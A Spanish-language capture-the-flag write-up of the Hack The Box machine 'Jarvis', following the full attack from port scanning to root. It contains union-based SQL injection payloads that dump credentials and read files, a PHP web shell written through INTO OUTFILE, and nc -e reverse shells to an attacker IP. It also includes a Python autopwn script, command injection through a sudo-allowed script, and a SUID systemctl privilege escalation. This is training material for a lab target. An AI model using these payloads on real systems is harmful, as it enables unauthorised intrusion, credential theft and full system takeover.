---
layout: post
title: HTB_Jarvis
date: 2023/07/10
slug: HTB_Jarvis
heroImage: /assets/machines.jpg
---

# Jarvis {-}

## Introduccion {-}

La maquina del dia 18/08/2021 se llama Jarvis.

El replay del live se puede ver aqui

[![S4vitaar Jarvis maquina](https://img.youtube.com/vi/OPDexy66TD0/0.jpg)](https://www.youtube.com/watch?v=OPDexy66TD0)

No olvideis dejar un like al video y un commentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.143
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.143
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.143 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,80,64999, 10.10.10.143 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 22     | ssh      | Conneccion directa | usuario y contraseña |
| 80     | http     | Web, Fuzzing       |                      |
| 64999  | http     | Web, Fuzzing       |                      |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.143
```

Vemos un dominio 
```bash
 logger.htb 
```
 pero poco mas. Añadimo el dominio a nuestro 
```bash
 /etc/hosts 
```


#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.143 -oN webScan
```

Vemos que hay un 
```bash
 /phpmyadmin 
```


#### Analyzando la web con Firefox {-}

Es una web de un hotel donde se puede hacer reservaciones. Cuando miramos mas en profundidad, nos damos cuenta de algo que nos 
llama la atencion 
```bash
 http://10.10.10.143/room.php?cod=6 
```


Si cambiamos el **cod** con numeros invalidos vemos que intenta mostrarnos algo sin mensajes de error. Vamos a comprobar si esta
vulnerable a injeccion SQL## Vulnerability Assessment {-}

### SQL Injection {-}

Intentamos ver si la web responde a un ordenamiento de datos para ver si es vulnerable a Injeccion SQL:

```bash
http://10.10.10.143/room.php?cod=-1 order by 1 -- -
http://10.10.10.143/room.php?cod=-1 order by 2 -- -
http://10.10.10.143/room.php?cod=-1 order by 3 -- -
http://10.10.10.143/room.php?cod=-1 order by 4 -- -
http://10.10.10.143/room.php?cod=-1 order by 5 -- -
http://10.10.10.143/room.php?cod=-1 order by 6 -- -
http://10.10.10.143/room.php?cod=-1 order by 7 -- -
http://10.10.10.143/room.php?cod=-1 order by 8 -- -
http://10.10.10.143/room.php?cod=-1 order by 9 -- -
```

Aqui no vemos nada. Intentamos ver con un union select si podemos enumerar las columnas

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7 -- -
```

Cuando acemos una selection de las 7 columnas, podemos ver en la web que nos reporta estas etiquetas en la pagina.



![Jarvis-uio-select](/assets/images/Jarvis-union-select.png) 
Aqui vemos que podemos injectar SQL en las columnas **5 - 2 - 3 - 4**

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,database(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,version(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,user(),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/etc/passwd"),4,5,6,7 -- -
```

> [ ! ] NOTAS: Si la web no deja incorporar String como en el methodo load_file, se puede transformar el String 
```bash
 /etc/passwd 
```
 en hexadecimal y colocarlo ahi. Haciendo
un 
```bash
 echo "/etc/passwd" | tr -d '\n' | xxd -ps 
```
 -> 2f6574632f706173737764 y ponerlo en la web 
```bash
 1,2,load_file(0x2f6574632f706173737764),4,5,6,7 
```


Aqui vemos que tenemos capacidad de lectura sobre ficheros internos passando por la Injeccion SQL. Continuamos

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/tcp"),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/fib_trie"),4,5,6,7 -- -
```

Esto no nos reporta nada. Bueno, ya sabemos que existen 2 usuarios en la maquina:

- root 
- pepper

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/.ssh/id_rsa"),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/user.txt"),4,5,6,7 -- -
```

Como vemos que no se puede avanzar mucho con la LFI, vamos a tirar mas del analysis de la base de datos.

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 2,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 3,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 2,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room"-- -
```

#### Aprovechando de la mysql db {-}

Como existe una tabla my_sql probamos a ver si encontramos usuarios y contraseña para esta base de datos.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,group_concat(User,0x3A,Password),4,5,6,7 from mysql.user -- -
```

Vemos que existe el usuario DBAdmin con un hash de contraseña, si tiramos de Rainbow Tables como [CrackStation](https://crackstation.net/) vemos la contraseña
en texto claro.

Teniendo esto en cuenta, podriamos aprovechar de connectarnos a la routa 
```bash
 /phpmyadmin/ 
```
 para lanzar commandos.


#### Using SQL Injection para crear ficheros {-}

Mirando las columnas de la tabla **hotel**, nos damos cuenta que no hay informaciones relevante como usuarios o contraseña. Aqui pensamos que los
tiros no van para el mismo camino. Miramos si tenemos capacidad de escritura.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,"Hola esto es una prueba",4,5,6,7 into outfile "/var/www/html/prueba.txt" -- -
```

Aqui intentamos crear un fichero prueba.txt que creamos en una de las routas mas communes, y si lanzamos el commando y que navegamos por 

```bash
 http://10.10.10.143/prueba.txt 
```
 vemos el contenido.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/html/prueba.php" -- -
```

Aqui vemos www-data como usuario. Vamos a intentar ganar accesso al systema.

> [ ! ] NOTAS: todo esto se podria hacer de la misma manera desde el panel 
```bash
 phpmyadmin 
```


## Vuln exploit & Gaining Access {-}

### S4vishell desde un SQL Injection {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos la s4vishell.php desde el SQL Injection

    ```bash
    http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/s4vishell.php" -- -
    ```

1. Vamos a la pagina 
```bash
 http://10.10.10.143/s4vishell.php 
```

1. Probamos commandos

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=id
    http://10.10.10.143/s4vishell.php?cmd=hostname -I
    http://10.10.10.143/s4vishell.php?cmd=ps -faux
    http://10.10.10.143/s4vishell.php?cmd=which nc
    ```

1. lanzamos una reverse SHELL

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.7 443
    ```

Ya hemos ganado accesso al systema.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Autopwn in python {-}

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import time 
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo..\n")
    sys.exit(1)

# Ctrl_C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php system('nc -e /bin/bash 10.10.14.7 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -'''
exec_file = "http://10.10.10.143/reverse.php"
lport = 443

def makeRequest():
    r = request.get(create_file)
    r = request.get(exec_file)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()

```

### User pivoting al usuario pepper {-}

Hemos podido comprobar que no podiamos leer el fichero 
```bash
 user.txt 
```
 siendo el usuario 
```bash
 www-data 
```
. Tendremos que convertirnos en el usuario
**pepper** antes de intentar rootear la maquina.

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar el script 
```bash
 /var/www/Admin-Utilities/simpler.py 
```
 como el usuario **pepper** sin proporcinar contraseña.

Si lanzamos el script con el commando 
```bash
 sudo -u pepper /var/www/Admin-Utilities/simpler.py 
```
 vemos que es una utilidad que lanza un ping a maquinas
definidas por el commando 
```bash
 -p 
```
.

si nos ponemos en escucha por trazas **ICMP** con el commando 
```bash
 tcpdump -i tun0 icmp -n 
```
 y que lanzamos el script:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.7
```

Recibimos la traza **ICMP**.

Intentamos ver si podemos injectar commandos con el script.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.$(echo 7)
```

Aqui tambien recibimos la traza **ICMP** lo que significa que el programa interpreta codigo.

Si nos ponemos en escucha por el puerto 443 con 
```bash
 nc -nlvp 443 
```
 y que le ponemos

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(nc -e /bin/bash 10.10.14.7 443)
```

No funcciona. Si miramos el codigo fuente de script en python, vemos que hay caracteres que son considerados como invalidos.
Uno de ellos es el 
```bash
 - 
```


Decidimos crearnos un fichero 
```bash
 reverse.sh 
```


```bash
cd /tmp
nano reverse.sh`


#!/bin/bash

nc -e /bin/bash 10.10.14.7 443
```

Le damos derechos de ejecucion y lanzamos el script una vez mas.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(bash /tmp/reverse.sh)
```

Ya hemos podido entablar la conneccion como el usuario pepper y podemos ver la flag.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/pepper
ls
cd /Web
cd /Logs
cat 10.10.14.7.txt
```

Aqui vemos que nos a loggeado toda la Injeccion SQL.

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
```

Vemos que systemctl es SUID y que tiene proprietario root

```bash
cd 
mkdir privesc
cd privesc
cp /tmp/reverse.sh privesc.sh
```

Aqui nos vamos a crear un systemctl service file -> 
```bash
 nano privesc.service 
```


```bash
[Unit]
Description=EEEEEEEe

[Service]
ExecStart=/home/pepper/privesc/privesc.sh

[Install]
WantedBy=multi-user.target
```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un link del servicio

    ```bash
    systemctl link /home/pepper/privesc/privesc.service
    ```

1. Lanzamos el servicio

    ```bash
    systemctl enable --now /home/pepper/privesc/privesc.service
    ```



```bash
 whoami 
```
 -> root ;)
